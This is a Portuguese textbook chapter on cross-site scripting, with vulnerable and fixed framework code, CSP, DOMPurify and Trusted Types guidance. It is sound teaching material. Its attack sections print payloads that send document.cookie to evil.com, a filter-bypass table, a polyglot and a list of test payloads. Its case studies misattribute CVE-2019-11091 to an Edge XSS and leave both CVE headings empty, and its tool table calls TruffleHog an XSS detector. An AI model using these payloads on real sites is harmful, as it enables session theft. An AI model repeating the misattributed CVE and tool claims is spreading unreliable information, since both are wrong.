# Capítulo 5: Cross-Site Scripting (XSS)

> *"XSS é a vulnerabilidade web mais persistente da história — e continua matando aplicações."*

---

## Objetivos de Aprendizado

1. Diferenciar Reflected, Stored e DOM-based XSS com exemplos práticos
2. Implementar técnicas de prevenção em frameworks JavaScript modernos
3. Configurar Content Security Policy para mitigar XSS
4. Usar DOMPurify e Trusted Types para sanitização de HTML
5. Testar e auditar aplicações para vulnerabilidades XSS

---

## 5.1 O Que é XSS?

Cross-Site Scripting (XSS) ocorre quando uma aplicação web inclui conteúdo não confiável em sua resposta sem validação ou sanitização adequada. O atacante injeta scripts maliciosos que executam no contexto do navegador da vítima.

### Triângulo do XSS

```
Vítima (navegador) ← Executa script ← Servidor ← Atacante (injeta script)
```

### Impacto

| Impacto | Exemplo |
|---------|---------|
| Session hijacking | Roubo de cookie de sessão |
| Credential theft | Phishing via formulário injetado |
| Defacement | Modificação visual da página |
| Keylogging | Captura de teclado do usuário |
| Cryptocurrency mining | Mineração via script injetado |
| Worm propagation | Ataque que se auto-replica |

---

## 5.2 Tipos de XSS

### 5.2.1 Reflected XSS

O payload está na URL ou em um parâmetro de request que é refletido na resposta:

```
https://exemplo.com/search?q=<script>alert('XSS')</script>
```

```javascript
// VULNERÁVEL (Express.js)
app.get('/search', (req, res) => {
    res.send(`<h1>Resultados para: ${req.query.q}</h1>`);
});

// CORRETO
const escapeHtml = require('escape-html');
app.get('/search', (req, res) => {
    res.send(`<h1>Resultados para: ${escapeHtml(req.query.q)}</h1>`);
});
```

### 5.2.2 Stored XSS

O payload é armazenado no banco de dados e entregue a outros usuários:

```python
# VULNERÁVEL (Flask)
@app.route('/comment', methods=['POST'])
def add_comment():
    comment = request.form['comment']
    db.execute("INSERT INTO comments (body) VALUES (?)", [comment])
    return redirect('/comments')

# No template (Jinja2 sem autoescape):
@app.route('/comments')
def show_comments():
    comments = db.execute("SELECT * FROM comments").fetchall()
    return render_template('comments.html', comments=comments, autoescape=False)  # PERIGOSO
```

```html
<!-- comments.html VULNERÁVEL -->
{% for comment in comments %}
<div class="comment">{{ comment.body | safe }}</div>  <!-- XSS! -->
{% endfor %}

<!-- comments.html SEGURO -->
{% for comment in comments %}
<div class="comment">{{ comment.body }}</div>  <!-- autoescape ON por padrão -->
{% endfor %}
```

### 5.2.3 DOM-based XSS

O payload é processado inteiramente no lado do cliente:

```javascript
// VULNERÁVEL — DOM XSS
const name = new URLSearchParams(window.location.search).get('name');
document.getElementById('output').innerHTML = `Olá, ${name}!`;
// URL: ?name=<img src=x onerror=alert(1)>

// CORRETO
const name = new URLSearchParams(window.location.search).get('name');
document.getElementById('output').textContent = `Olá, ${name}!`;
// textContent não interpreta HTML
```

**Sinks perigosos no DOM:**

| Sink | Risco | Alternativa |
|------|-------|-------------|
| `innerHTML` | Alto | `textContent` |
| `outerHTML` | Alto | `textContent` |
| `document.write()` | Alto | `createElement` + `appendChild` |
| `eval()` | Crítico | N/A — nunca usar |
| `setTimeout(string)` | Alto | `setTimeout(function)` |
| `setInterval(string)` | Alto | `setInterval(function)` |
| `new Function(string)` | Alto | Nunca |
| `$.html()` (jQuery) | Alto | `.text()` |

### 5.2.4 Mutation XSS (mXSS)

Acontece quando o navegador reescreve o DOM de forma inesperada:

```javascript
// Mutation XSS: payload muda após inserção
const payload = '<noscript><p title="</noscript><img src=x onerror=alert(1)>">';
element.innerHTML = payload;
// O navegador reescreve o DOM, expondo o onerror
```

---

## 5.3 Vetores de Ataque

### 5.3.1 Via Parâmetros de URL

```
https://app.com/page?title=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

### 5.3.2 Via Formulários

```html
<!-- Formulário com campo que aceita HTML -->
<form action="/profile" method="POST">
    <input name="bio" value="<script>alert(1)</script>">
    <button type="submit">Salvar</button>
</form>
```

### 5.3.3 Via HTTP Headers

```
Referer: https://evil.com/<script>alert(1)</script>
User-Agent: <script>alert(1)</script>
```

### 5.3.4 Via URL Fragments

```
https://app.com/#<img src=x onerror=alert(1)>
```

### 5.3.5 Via Upload de Arquivos

```javascript
// Upload de SVG com script embutido
const maliciousSVG = `<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
    <text x="10" y="20">XSS via SVG</text>
</svg>`;
```

---

## 5.4 XSS em Frameworks Modernos

### 5.4.1 React

```jsx
// VULNERÁVEL — dangerouslySetInnerHTML
function Comment({ text }) {
    return <div dangerouslySetInnerHTML={{ __html: text }} />;  // XSS!
}

// SEGURO — React auto-escapes por padrão
function Comment({ text }) {
    return <div>{text}</div>;  // Seguro — escape automático
}

// VULNERÁVEL — href com javascript:
function Link({ url }) {
    return <a href={url}>Click</a>;  // url = "javascript:alert(1)"
}

// SEGURO — validação de URL
function Link({ url }) {
    const isSafe = url.startsWith('https://');
    return <a href={isSafe ? url : '#'}>Click</a>;
}
```

### 5.4.2 Vue.js

```vue
<!-- VULNERÁVEL — v-html -->
<div v-html="userContent"></div>

<!-- SEGURO — interpolação padrão -->
<div>{{ userContent }}</div>

<!-- SEGURO — sanitização antes de v-html -->
<script>
import DOMPurify from 'dompurify';

export default {
    computed: {
        safeContent() {
            return DOMPurify.sanitize(this.userContent);
        }
    }
}
</script>
```

### 5.4.3 Angular

```typescript
// VULNERÁVEL — bypassSecurityTrust
@Component({
    template: `<div [innerHTML]="trustedContent"></div>`
})
export class UnsafeComponent {
    trustedContent = this.sanitizer.bypassSecurityTrustHtml('<img src=x onerror=alert(1)>');
}

// SEGURO — Angular auto-sanitiza por padrão
@Component({
    template: `<div [innerHTML]="userContent"></div>`  // Sanitizado automaticamente
})
export class SafeComponent {
    userContent = '<b>Texto seguro</b>';  // Script tags removidos
}
```

---

## 5.5 Prevenção

### 5.5.1 Content Security Policy (CSP)

```
Content-Security-Policy: 
    default-src 'self';
    script-src 'self' 'nonce-abc123';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self';
    connect-src 'self' https://api.exemplo.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
```

### 5.5.2 DOMPurify

```javascript
import DOMPurify from 'dompurify';

// Configuração padrão — segura
const clean = DOMPurify.sanitize(dirty);

// Configuração para Markdown
const clean = DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOW_DATA_ATTR: false
});

// Configuração para rich text editor
const clean = DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['p', 'br', 'b', 'i', 'u', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'blockquote', 'code', 'pre'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    ALLOW_DATA_ATTR: false
});
```

### 5.5.3 Output Encoding

| Contexto | Encoding | Exemplo |
|----------|----------|---------|
| HTML Body | HTML entity encoding | `<` → `&lt;` |
| HTML Attribute | Attribute encoding | `"` → `&quot;` |
| JavaScript | JS encoding | `'` → `\x27` |
| URL | URL encoding | ` ` → `%20` |
| CSS | CSS encoding | `\3C` para `<` |

```javascript
// Funções de encoding
function escapeHtml(str) {
    const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;' };
    return str.replace(/[&<>"']/g, c => map[c]);
}

function escapeAttribute(str) {
    return str.replace(/[^a-zA-Z0-9,.\-_]/g, c => '&#' + c.charCodeAt(0) + ';');
}

function escapeJs(str) {
    return str.replace(/['"\\]/g, c => '\\' + c);
}
```

### 5.5.4 Trusted Types API

```javascript
// Habilitar Trusted Types
if (window.trustedTypes && trustedTypes.createPolicy) {
    const policy = trustedTypes.createPolicy('default', {
        createHTML: (str) => DOMPurify.sanitize(str),
        createScriptURL: (str) => {
            const url = new URL(str, document.baseURI);
            if (url.origin !== window.location.origin) throw new Error('Cross-origin blocked');
            return url;
        },
        createScript: (str) => {
            throw new Error('Inline scripts blocked by Trusted Types');
        }
    });
}

// Agora, qualquer tentativa de usar innerHTML passa pelo policy
element.innerHTML = untrustedString;  // Automaticamente sanitizado
```

---

## 5.6 Técnicas de Bypass e Evasão

### 5.6.1 Filtros Comuns e Evasão

| Filtro | Payload de Bypass |
|--------|-------------------|
| `<script>` removido | `<img src=x onerror=alert(1)>` |
| `onerror` removido | `<svg onload=alert(1)>` |
| `alert` removido | `<script>confirm(1)</script>` |
| `javascript:` removido | `<a href="java&#x73;cript:alert(1)">` |
| Espaços removidos | `<img/src=x/onerror=alert(1)>` |
| Aspas removidas | `<script>document.location=`http://evil.com/`+document.cookie</script>` |

### 5.6.2 Polyglots

```javascript
// Polyglot XSS — funciona em múltiplos contextos
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
```

---

## 5.7 Casos Reais

### CVE-2019-11091: Microsoft Edge XSS

### CVE-2020-1598: Chromium V8 XSS

### Stored XSS em Redes Sociais (caso genérico)

Um XSS armazenado em um campo de perfil pode:
1. Roubar sessões de todos os seguidores
2. Auto-replicar (worm XSS)
3. Minerar criptomoedas nos navegadores das vítimas
4. Redirecionar para phishing

---

## 5.8 Testes de XSS

### 5.8.1 Payloads de Teste

```javascript
// Testes básicos
'<script>alert(document.domain)</script>'
'<img src=x onerror=alert(1)>'
'<svg onload=alert(1)>'
'<body onload=alert(1)>'
'<iframe src="javascript:alert(1)">'

// Testes de context
'"-alert(1)-"'
"'><script>alert(1)</script>"
"javascript:alert(1)"
```

### 5.8.2 Ferramentas

| Ferramenta | Tipo | Uso |
|------------|------|-----|
| XSS Hunter | Stored XSS | Monitoramento de payloads |
| Dalfox | Scanner | XSS automated detection |
| Burp Suite | Proxy | Manual testing |
| OWASP ZAP | Scanner | Automated + manual |
| TruffleHog | SAST | Code-level detection |

---

## 5.9 Exercícios

### Exercício 1: Identificar XSS
Encontre e explique 3 vulnerabilidades XSS em um aplicativo web de exemplo.

### Exercício 2: CSP Configuration
Configure CSP para um blog que aceita comentários com formatação básica (bold, italic, links).

### Exercício 3: DOMPurify Custom
Crie uma configuração DOMPurify que aceite Markdown renderizado mas bloqueie todos os event handlers.

### Exercício 4: Framework Security
Escreva um componente React que renderize HTML do usuário de forma segura, suportando imagens e links.

### Exercício 5: Pen Test
Use Burp Suite ou OWASP ZAP para testar XSS em uma aplicação de exemplo (DVWA ou Juice Shop).

---

## 5.10 Referências

1. OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html
2. OWASP DOM based XSS Prevention: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
3. DOMPurify: https://github.com/cure53/DOMPurify
4. Trusted Types: https://web.dev/trusted-types/
5. Content Security Policy: https://content-security-policy.com/
6. PortSwigger XSS: https://portswigger.net/web-security/cross-site-scripting
7. Mozilla Security Headers: https://infosec.mozilla.org/guidelines/web_security
8. Google CSP Evaluator: https://csp-evaluator.withgoogle.com/
9. XSS Game (Google): https://xss-game.appspot.com/
10. SecLists XSS Payloads: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS

---

*[Capítulo anterior: 04 — SQL Injection](04-sql-injection.md)*
*[Próximo capítulo: 06 — CSRF e Clickjacking](06-csrf-clickjacking.md)*
